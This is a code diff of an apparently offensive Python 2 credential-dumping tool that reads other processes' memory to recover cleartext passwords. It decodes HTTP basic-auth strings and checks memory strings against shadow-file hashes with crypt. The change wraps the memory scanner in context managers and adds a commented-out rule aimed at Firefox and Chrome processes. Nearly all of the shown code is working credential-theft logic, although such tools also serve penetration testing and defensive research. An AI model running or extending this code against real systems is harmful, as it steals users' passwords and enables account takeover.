@@ -137,24 +137,24 @@ def search_password(optimizations='nsrx'):
             continue #avoid false positives when password has been printed to screen by this script x)
         logging.info("Searching pass in %s (%s)"%(name, pid))
         try:
-            mw=MemWorker(pid=pid)
-            #for _,x in mw.mem_search(r"\$[0-9][a-z]?\$(?:[a-zA-Z0-9\./\-\+]{4,}\$)?[a-zA-Z0-9\./\-\+]{20,}", ftype='re'):
-            #    h=x.read(type='string', maxlen=300)
-            #    print "hash found in %s (%s) : %s"%(name, pid, h)
-            #    strings_list=get_strings_around(mw, x, h)
-            #    print "strings found around : %s"%strings_list
-            #    if not strings_list:
-            #        x.dump(before=200, size=400)
-            for x in mw.mem_search(mypasswd, optimizations=optimizations):
-                print colorize("[+] password found in process %s (%s) : %s !"%(name, pid, x), color="green")
-                x.dump(before=1000, size=2000)
-                print "strings found around : "
-                strings_list=get_strings_around(mw, x, mypasswd)
-                print "strings found around : %s"%strings_list
-                #print "strings where the password's address is referenced :"
-                #for _,o in mw.search_address(x):
-                #    o.dump(before=200, size=400)
-                #print "done"
+            with MemWorker(pid=pid) as mw:
+                #for _,x in mw.mem_search(r"\$[0-9][a-z]?\$(?:[a-zA-Z0-9\./\-\+]{4,}\$)?[a-zA-Z0-9\./\-\+]{20,}", ftype='re'):
+                #    h=x.read(type='string', maxlen=300)
+                #    print "hash found in %s (%s) : %s"%(name, pid, h)
+                #    strings_list=get_strings_around(mw, x, h)
+                #    print "strings found around : %s"%strings_list
+                #    if not strings_list:
+                #        x.dump(before=200, size=400)
+                for x in mw.mem_search(mypasswd, optimizations=optimizations):
+                    print colorize("[+] password found in process %s (%s) : %s !"%(name, pid, x), color="green")
+                    x.dump(before=1000, size=2000)
+                    print "strings found around : "
+                    strings_list=get_strings_around(mw, x, mypasswd)
+                    print "strings found around : %s"%strings_list
+                    #print "strings where the password's address is referenced :"
+                    #for _,o in mw.search_address(x):
+                    #    o.dump(before=200, size=400)
+                    #print "done"
 
         except Exception as e:
             logging.error("Error scanning process %s (%s): %s"%(name, pid, e))
@@ -162,59 +162,58 @@ def search_password(optimizations='nsrx'):
 
 def group_search(name, pid, rule, clean=False, cred_cb=None, optimizations='nsrx'):
     logging.info("Analysing process %s (%s) for passwords ..."%(name, pid))
-    mw = MemWorker(name=name, pid=pid)
-            
-    for service, x in mw.mem_search(rule["groups"], ftype='ngroups', optimizations=optimizations):
-        user=""
-        password=""
-        if "basic" in x:
-            try:
-                user, password=base64.b64decode(x["basic"]).split(":",1)
-            except:
-                pass
-        elif "Login" in x and "Password" in x:
-            user=x["Login"]
-            password=x["Password"]
-        else:
-            password=str(x)
-            
-        yield (rule["desc"]+" "+service, user, password)
+    with MemWorker(name=name, pid=pid) as mw:
+        for service, x in mw.mem_search(rule["groups"], ftype='ngroups', optimizations=optimizations):
+            user=""
+            password=""
+            if "basic" in x:
+                try:
+                    user, password=base64.b64decode(x["basic"]).split(":",1)
+                except:
+                    pass
+            elif "Login" in x and "Password" in x:
+                user=x["Login"]
+                password=x["Password"]
+            else:
+                password=str(x)
+                
+            yield (rule["desc"]+" "+service, user, password)
 
 
 def test_shadow(name, pid, rule, clean=False, cred_cb=None, optimizations='nsrx'):
     logging.info("Analysing process %s (%s) for shadow passwords ..."%(name, pid))
     password_tested=set() #to avoid hashing the same string multiple times
-    mw=MemWorker(name=name, pid=pid)
-    scanned_segments=[]
-    for _,match_addr in mw.mem_search(rule["near"], ftype='re', optimizations=optimizations):
-        password_list=[]
-        total=0
-        start=int(match_addr-LOOK_AFTER_SIZE)
-        end=int(match_addr+LOOK_AFTER_SIZE)
-        for s,e in scanned_segments:
-            if end < s or start > e:
-                continue #no collision
-            elif start >=s and e >= start and end >= e:
-                logging.debug("%s-%s reduced to %s-%s"%(hex(start), hex(end), hex(e), hex(end)))
-                start=e-200 #we only scan a smaller region because some of it has already been scanned
-        logging.debug("looking between offsets %s-%s"%(hex(start),hex(end)))
-        scanned_segments.append((start, end))
-        for x in memstrings(mw, start_offset=start, end_offset=end, optimizations=optimizations):
-            passwd=cleanup_string(x.read(type='string', maxlen=51, errors='ignore'))
-            total+=1
-            password_list.append(passwd)
-            if len(password_list)>40:
-                password_list=password_list[1:]
-            if password_list_match(password_list, rule["near"]):
-                for p in password_list:
-                    if p not in password_tested:
-                        password_tested.add(p)
-                        for user, h in shadow_hashes:
-                            if crypt.crypt(p, h) == h:
-                                yield (rule["desc"], user, p)
-                                if clean:
-                                    logging.info("cleaning password from memory in proc %s at offset: %s ..."%(name, hex(x)))
-                                    x.write("x"*len(p))
+    with MemWorker(name=name, pid=pid) as mw:
+        scanned_segments=[]
+        for _,match_addr in mw.mem_search(rule["near"], ftype='re', optimizations=optimizations):
+            password_list=[]
+            total=0
+            start=int(match_addr-LOOK_AFTER_SIZE)
+            end=int(match_addr+LOOK_AFTER_SIZE)
+            for s,e in scanned_segments:
+                if end < s or start > e:
+                    continue #no collision
+                elif start >=s and e >= start and end >= e:
+                    logging.debug("%s-%s reduced to %s-%s"%(hex(start), hex(end), hex(e), hex(end)))
+                    start=e-200 #we only scan a smaller region because some of it has already been scanned
+            logging.debug("looking between offsets %s-%s"%(hex(start),hex(end)))
+            scanned_segments.append((start, end))
+            for x in memstrings(mw, start_offset=start, end_offset=end, optimizations=optimizations):
+                passwd=cleanup_string(x.read(type='string', maxlen=51, errors='ignore'))
+                total+=1
+                password_list.append(passwd)
+                if len(password_list)>40:
+                    password_list=password_list[1:]
+                if password_list_match(password_list, rule["near"]):
+                    for p in password_list:
+                        if p not in password_tested:
+                            password_tested.add(p)
+                            for user, h in shadow_hashes:
+                                if crypt.crypt(p, h) == h:
+                                    yield (rule["desc"], user, p)
+                                    if clean:
+                                        logging.info("cleaning password from memory in proc %s at offset: %s ..."%(name, hex(x)))
+                                        x.write("x"*len(p))
 shadow_hashes=[]
 def mimipy_loot_passwords(clean=False, optimizations='nsrx'):
     global shadow_hashes
@@ -276,6 +275,12 @@ rules = [
 		"func" : group_search,
         "groups" : HTTP_AUTH_REGEX,
     },
+#    {
+#        "desc" : "[Browser]",
+#        "process" : r"firefox|iceweasel|chromium|chrome",
+#		"func" : group_search,
+#        "groups" : HTTP_AUTH_REGEX,
+#    },
 ]
 
 REGEX_TYPE=type(re.compile("^plop$"))
